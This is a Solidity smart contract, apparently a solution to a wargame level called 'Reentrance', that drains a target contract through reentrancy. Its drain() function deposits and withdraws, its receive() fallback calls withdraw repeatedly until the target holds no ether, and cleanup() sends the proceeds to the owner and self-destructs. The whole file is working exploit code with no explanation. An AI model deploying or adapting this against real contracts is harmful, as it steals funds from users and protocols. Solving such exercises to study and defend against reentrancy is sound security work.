```solidity
// SPDX-License-Identifier: MIT

pragma solidity >0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract ReentranceSolution {
    address payable owner;
    IReentrance r;

    constructor(address _address) {
        owner = payable(msg.sender);
        r = IReentrance(_address);
    }

    function drain() external payable  {
        r.donate{value: msg.value}(address(this));
        r.withdraw(msg.value);
    }

    receive() external payable {
        uint256 remainingBalance = address(r).balance;
        if (remainingBalance > 0) {
            r.withdraw(
                msg.value > remainingBalance
                    ? remainingBalance
                    : msg.value
            );
        }
    }

    function cleanup() external  {
        owner.transfer(address(this).balance);
        selfdestruct(owner);
    }
}
```
